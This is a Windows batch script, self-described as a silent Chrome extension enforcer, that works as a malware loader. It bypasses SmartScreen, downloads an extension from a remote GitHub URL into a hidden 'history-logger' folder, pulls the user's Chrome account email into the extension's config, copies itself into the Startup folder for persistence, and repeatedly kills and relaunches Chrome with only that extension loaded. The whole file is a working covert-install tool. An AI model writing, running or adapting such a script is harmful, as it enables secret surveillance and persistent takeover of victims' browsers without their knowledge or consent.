@echo off
setlocal EnableDelayedExpansion

REM Minimal silent Chrome extension enforcer
REM Downloads, unzips, and runs Chrome with extension secretly using only batch
REM No visible CMD window, bypasses SmartScreen, ensures single instance

REM 1) Unblock the script to bypass SmartScreen
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%~f0'" >nul 2>&1

REM 2) CONFIG: GitHub raw zip URL
set "ZIP_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/extension.zip"

REM Set hidden work directory
set "WORKDIR=%USERPROFILE%\AppData\Local\history-logger-%RANDOM%"
mkdir "%WORKDIR%" >nul 2>&1
attrib +h "%WORKDIR%" >nul 2>&1
set "EXT_DIR=%WORKDIR%"

REM 3) Download extension.zip
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" >nul 2>&1

REM 4) Extract ext.zip
powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -LiteralPath '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" >nul 2>&1

REM 5) Locate manifest.json and background.js
set "FOUND=0"
if exist "%WORKDIR%\manifest.json" (
  if exist "%WORKDIR%\background.js" (
    set "EXT_DIR=%WORKDIR%"
    set "FOUND=1"
  )
)
if "%FOUND%"=="0" (
  for /D %%D in ("%WORKDIR%\*") do (
    if exist "%%D\manifest.json" (
      if exist "%%D\background.js" (
        set "EXT_DIR=%%D"
        set "FOUND=1"
        goto :got
      )
    )
  )
)
:got
if "%FOUND%"=="0" exit /b 1

REM 6) Scan Chrome profiles for email
set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`
      powershell -NoProfile -ExecutionPolicy Bypass -Command "(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email"
    `) do if not defined EMAIL (
      set "EMAIL=%%E"
    )
  )
)
if not defined EMAIL set "EMAIL=anonymous@demo.com"

REM 7) Write config.json
> "%EXT_DIR%\config.json" echo {"userEmail":"!EMAIL!"} >nul 2>&1

REM 8) Locate chrome.exe
set "CHROME_PATH="
for %%P in (
  "%ProgramFiles%\Google\Chrome\Application\chrome.exe"
  "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
  "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
) do if exist "%%~P" set "CHROME_PATH=%%~P"
if not defined CHROME_PATH exit /b 1

REM 9) Ensure script runs on startup
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SCRIPT_NAME=ChromeExtensionEnforcerSilent.bat"
copy "%~f0" "%STARTUP_DIR%\%SCRIPT_NAME%" >nul 2>&1

REM 10) Terminate existing Chrome processes
tasklist | find /I "chrome.exe" >nul 2>&1
if not errorlevel 1 (
  taskkill /IM chrome.exe /F >nul 2>&1
  timeout /t 3 >nul 2>&1
)

REM 11) Launch Chrome with extension
set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
if not exist "!PROFILE_DIR!" mkdir "!PROFILE_DIR!" >nul 2>&1
start /min "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%" >nul 2>&1

REM 12) Monitor and enforce single Chrome instance
:monitor
set "CHROME_COUNT=0"
tasklist | find /I "chrome.exe" > "%TEMP%\chrome_processes.txt"
for /f "tokens=2" %%A in (%TEMP%\chrome_processes.txt) do set /a CHROME_COUNT+=1
del "%TEMP%\chrome_processes.txt" >nul 2>&1
if "!CHROME_COUNT!" GTR "1" (
  taskkill /IM chrome.exe /F >nul 2>&1
  timeout /t 3 >nul 2>&1
  start /min "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%" >nul 2>&1
) else if "!CHROME_COUNT!"=="0" (
  start /min "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%" >nul 2>&1
)
timeout /t 5 >nul 2>&1
goto :monitor
